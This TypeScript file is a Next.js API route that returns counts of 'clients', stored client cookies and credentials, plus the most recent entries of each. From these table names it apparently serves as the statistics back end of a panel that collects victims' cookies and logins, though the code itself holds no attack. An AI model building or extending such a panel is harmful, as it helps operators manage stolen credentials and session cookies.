// app/api/stats/route.ts
import { NextResponse } from "next/server";
import { mainDb } from "@/lib/db";
import { clients, clientCookies, credentials } from "@/lib/schema/main.schema";
import { count, desc } from "drizzle-orm";
import { requireRouteSession } from "@/lib/auth";

export async function GET() {
  try {
    if (!(await requireRouteSession())) return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 });
    // Aggregated counts — one query each, fully type-safe
    const [clientsCount] = mainDb.select({ count: count() }).from(clients).all();
    const [cookiesCount] = mainDb.select({ count: count() }).from(clientCookies).all();
    const [credentialsCount] = mainDb.select({ count: count() }).from(credentials).all();

    const recentClients = mainDb
      .select()
      .from(clients)
      .orderBy(desc(clients.last_seen))
      .limit(5)
      .all();

    const recentCredentials = mainDb
      .select()
      .from(credentials)
      .orderBy(desc(credentials.timestamp))
      .limit(5)
      .all();

    return NextResponse.json({
      success: true,
      stats: {
        clients: clientsCount?.count ?? 0,
        cookies: cookiesCount?.count ?? 0,
        credentials: credentialsCount?.count ?? 0,
      },
      recentClients,
      recentCredentials,
    });
  } catch (error: any) {
    console.error("Stats API Error:", error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}
